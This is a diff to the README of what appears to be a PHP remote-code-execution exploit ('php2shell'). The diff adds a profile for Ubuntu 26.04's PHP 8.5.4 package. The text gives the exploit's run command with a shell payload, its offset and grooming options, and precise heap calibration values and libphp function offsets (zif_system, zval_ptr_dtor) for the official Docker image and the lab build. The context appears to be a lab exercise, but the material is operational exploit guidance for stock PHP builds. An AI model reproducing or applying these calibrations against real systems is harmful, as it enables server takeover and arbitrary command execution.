@@ -65,7 +65,9 @@ printf 'id; uname -a > /out/p1\n' > out/c
 python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'sh</out/c'
 ```
 
-Common options: `--profile`, `--cmd`, `--proof-file`, `--fetch`, `--zif-offset`, `--dtor-offset`, `--htdata-offset`, `--no-pre-rotate`, `--retries`. The default profile is `bookworm` (official image); use `--profile lab` for the original lab build. `--offsets-file ''` disables automatic loading; specify `--docker-container` when the container name is not `php2shell-target`.
+Common options: `--profile`, `--cmd`, `--proof-file`, `--fetch`, `--zif-offset`, `--dtor-offset`, `--htdata-offset`, `--no-pre-rotate`, `--retries`. The default profile is `bookworm` (official image); use `--profile ubuntu855` for Ubuntu 26.04 `8.5.4-0ubuntu1.3`; use `--profile lab` for the original lab build. `--offsets-file ''` disables automatic loading; specify `--docker-container` when the container name is not `php2shell-target`.
+
+The full Ubuntu 8.5.4 amd64 calibration, Rosetta notes, and one-shot reproduction are in [UBUNTU855.md](UBUNTU855.md).
 
 The bookworm heap calibration is built in: stage1 filler count **841**; stage2 target array **406**, element value length **16**; stage3 `HTDATA=chunk+0x690d8`, A's pads are 6×(31,31), plus a 32-character valid `Cookie: PHPSESSID` so that B reuses the stale id (`send_cookie=0`), preventing the session's `Set-Cookie` header from overwriting `val.type` at `R0+16`; B uses a 15B carrier to overwrite the reference's `val.value`. The official image's libphp offsets are read automatically as `zif_system=0x465370`, `zval_ptr_dtor=0x65eb60`; the original lab uses `0x43a870` / `0x613c50`.
 
